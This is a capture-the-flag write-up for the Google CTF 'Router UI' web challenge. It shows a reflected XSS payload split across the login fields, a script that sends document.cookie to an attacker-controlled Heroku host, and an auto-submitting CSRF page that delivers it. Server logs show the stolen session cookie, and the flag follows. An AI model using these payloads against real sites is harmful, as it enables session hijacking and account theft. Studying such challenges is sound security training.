### ROUTER UI
[Challenge Link](https://capturetheflag.withgoogle.com/#beginners/web-router-ui)

#### Exploit XSS
- When you login with a random user name and a random password, you will encounter an error(403) page `Wrong credentials: random//random`
- `//`??!! where did I see this???[!](http://lcamtuf.coredump.cx/tangled/)
- So... Let's go with 
	- Username: `<script src=https:`
	- Password: `URL/script.js></script>` 
	- URL?? I don't have public web server!!!
- `script.js`

		$ cat script.js
		window.location.href='https://URL/key/'+document.cookie; 


#### Ready Attacking Web Server
- https://devcenter.heroku.com/articles/getting-started-with-python
- Yeah!!!~~~
- Now
	- Username: `<script src=https:`
	- Password: `enigmatic-willow-73607.herokuapp.com/static/script.js></script>` 	

#### Send e-mal and steal cookie
- We have to send an e-mail with a link to the web page which
- will execute the exploit we found. Say....


		$ cat cats.html
		<!DOCTYPE HTML>
		<html>
		<head><title>CATS</title></head>
		<body>
		<img src="https://www.abc.net.au/news/image/8205452-3x2-340x227.jpg">
		<form name="cat" id="cat" method="POST" action="https://router-ui.web.ctfcompetition.com/login">
		<input name="username" value="&lt;script src=https:">
		<input name="password" value="enigmatic-willow-73607.herokuapp.com/static/script.js&gt;&lt/script&gt;">
		</form>
		<script>document.forms["cat"].submit();</script>
		</body>
		</html>

#### Boom!!
- wintermuted@googlegroups.com clicked the link!!!

		$ heroku logs --tail
		...
		2019-02-07T04:20:07.077960+00:00 heroku[router]: at=info method=GET path="/key/flag=Try%20the%20session%20cookie;%20session=Avaev8thDieM6Quauoh2TuDeaez9Weja" host=enigmatic-meadow-36807.herokuapp.com request_id=c9bad403-e00f-4ca6-b61b-4f21b4ce87ee fwd="35.240.117.48" dyno=web.1 connect=0ms service=5ms status=404 bytes=258 protocol=https
		2019-02-07T04:20:07.078214+00:00 app[web.1]: 10.7.217.98 - - [07/Feb/2019:04:20:07 +0000] "GET /key/flag=Try%20the%20session%20cookie;%20session=Avaev8thDieM6Quauoh2TuDeaez9Weja HTTP/1.1" 404 77 "https://router-ui.web.ctfcompetition.com/login" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/70.0.3538.77 Safari/537.36"
		...

- when you access `https://router-ui.web.ctfcompetition.com/` with the session cookie we got above

		<h2 id="iot">Google-Haus Credentials</h2>
		<form>
			<input type="password" value="CTF{Kao4pheitot7Ahmu}"/>
			<button>Submit</button>
		</form>
		<h2 id="iot">Media PC Credentials</h2>
		<form>
			<input type="password" value="CTF{Kao4pheitot7Ahmu}"/>
			<button>Submit</button>
		</form>